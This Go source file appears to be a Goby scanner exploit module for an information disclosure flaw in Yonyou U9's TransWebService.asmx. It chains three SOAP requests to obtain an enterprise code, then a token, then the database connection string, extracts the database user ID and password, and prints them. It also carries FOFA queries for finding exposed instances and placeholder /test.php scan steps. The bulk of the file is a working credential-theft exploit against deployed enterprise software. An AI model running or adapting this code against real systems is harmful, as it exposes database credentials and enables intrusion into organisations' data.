package exploits

import (
	"fmt"
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou U9 /TransWebService.asmx Information Disclosure Vulnerability",
    "Description": "<p>Adhering to the Internet gene, Yonyou U9 is the world's first multi-organization enterprise Internet application platform based on SOA cloud architecture. U9 helps multi-organization enterprises to achieve business model innovation, organizational change and management upgrade in the Internet era with fine management, industrial chain collaboration and social business. </p><p>The Yonyou u9 TransWebService.asmx exists an information disclosure vulnerability. An attacker can obtain sensitive database connection information, including database account password, through this interfacce.</p>",
    "Product": "Yonyou-U9",
    "Homepage": "https://u9cloud.yonyou.com/about/about",
    "DisclosureDate": "2024-08-26",
    "PostTime": "2024-08-28",
    "Author": "hhh3156",
    "FofaQuery": "body=\"logo-u9.png\" || (body=\"/images/u9-work-mobile.png\" && body=\"用友\")",
    "GobyQuery": "body=\"logo-u9.png\" || (body=\"/images/u9-work-mobile.png\" && body=\"用友\")",
    "Level": "2",
    "Impact": "<p>The Yonyou u9 TransWebService.asmx exists an information disclosure vulnerability. An attacker can obtain sensitive database connection information, including database account password, through this interfacce.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://u9cloud.yonyou.com/about/about\">https://u9cloud.yonyou.com/about/about</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Info",
            "type": "select",
            "value": "Info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "用友 U9 /TransWebService.asmx 信息泄露漏洞",
            "Product": "用友-U9",
            "Description": "<p>用友U9秉承互联网基因，是全球第一款基于SOA云架构的多组织企业互联网应用平台。U9以精细化管理、产业链协协同与社交化商业，帮助多组织企业在互联网时代实现商业模式创新、组织变革与管理升级。</p><p>用友u9 TransWebService.asmx 存在信息泄露漏洞，攻击者可通过该漏洞获取数据库连接信息包括数据库账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://u9cloud.yonyou.com/about/about\">https://u9cloud.yonyou.com/about/about</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友u9 TransWebService.asmx 存在信息泄露漏洞，攻击者可通过该漏洞获取数据库连接信息包括数据库账号密码等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Yonyou U9 /TransWebService.asmx Information Disclosure Vulnerability",
            "Product": "Yonyou-U9",
            "Description": "<p>Adhering to the Internet gene, Yonyou U9 is the world's first multi-organization enterprise Internet application platform based on SOA cloud architecture. U9 helps multi-organization enterprises to achieve business model innovation, organizational change and management upgrade in the Internet era with fine management, industrial chain collaboration and social business.&nbsp;</p><p>The Yonyou u9 TransWebService.asmx exists an information disclosure vulnerability. An attacker can obtain sensitive database connection information, including database account password, through this interfacce.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://u9cloud.yonyou.com/about/about\">https://u9cloud.yonyou.com/about/about</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The Yonyou u9 TransWebService.asmx exists an information disclosure vulnerability. An attacker can obtain sensitive database connection information, including database account password, through this interfacce.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9946"
}`

	sendPayload__buhfAYgiuy5864156LAinf0w4apUA63LK := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, SOAPAction string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			PostRequest.Header.Store("SOAPAction", SOAPAction)
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		path := "/CS/Office/TransWebService.asmx"
		data1 := `<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
    <soap:Header/>
    <soap:Body>
       <tem:GetEnterprise/>
    </soap:Body>
 </soap:Envelope>`
		SOAPAction1 := `http://tempuri.org/GetEnterprise`
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Type": "text/xml;charset=UTF-8",
		}

		resp1, err := setPostRequest(hostInfo, path, SOAPAction1, data1, header)
		if err != nil || resp1.StatusCode != 200 {
			return false, "", ""
		}

		regular1 := `\[{"Code":"([\s\S]*?)",`

		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}

		Code, err := makeRegular(resp1.RawBody, regular1)
		if err != nil || Code == "" {
			return false, "", ""
		}

		data2 := `<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
    <soap:Header/>
    <soap:Body>
       <tem:GetToken>
          <!--type: string-->
          <tem:endId>` + Code + `</tem:endId>
       </tem:GetToken>
    </soap:Body>
 </soap:Envelope>`
		SOAPAction2 := `http://tempuri.org/GetToken`

		resp2, err := setPostRequest(hostInfo, path, SOAPAction2, data2, header)
		if err != nil || resp2.StatusCode != 200 {
			return false, "", ""
		}
		regular2 := `{"Token":"([\s\S]*?)",`

		Token, err := makeRegular(resp2.RawBody, regular2)
		if err != nil || Token == "" {
			return false, "", ""
		}

		data3 := `<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
    <soap:Header/>
    <soap:Body>
       <tem:GetConnectionString>
          <!--type: string-->
          <tem:token>` + Token + `</tem:token>
       </tem:GetConnectionString>
    </soap:Body>
 </soap:Envelope>`
		SOAPAction3 := `http://tempuri.org/GetConnectionString`

		resp3, err := setPostRequest(hostInfo, path, SOAPAction3, data3, header)
		if err != nil || resp2.StatusCode != 200 {
			return false, "", ""
		}

		regular_id := `User Id=([\s\S]*?);Password=[\s\S]*?;`
		regular_password := `User Id=[\s\S]*?;Password=([\s\S]*?);`

		id, err := makeRegular(resp3.RawBody, regular_id)
		if err != nil || id == "" {
			return false, "", ""
		}

		password, err := makeRegular(resp3.RawBody, regular_password)
		if err != nil || password == "" {
			return false, "", ""
		}

		return true, id, password
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, _ := sendPayload__buhfAYgiuy5864156LAinf0w4apUA63LK(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.FixedHostInfo + `/CS/Office/TransWebService.asmx`
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			resbool, id, password := sendPayload__buhfAYgiuy5864156LAinf0w4apUA63LK(expResult.HostInfo)
			if resbool == false {
				expResult.Success = false
				expResult.Output = "Exploitation failed"
				return expResult
			}

			Info := goutils.B2S(ss.Params["Info"])

			if Info == "Info" {
				expResult.Output = "数据库连接信息：\nUserID: " + id + "\nPassword: " + password
				expResult.Success = true

			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
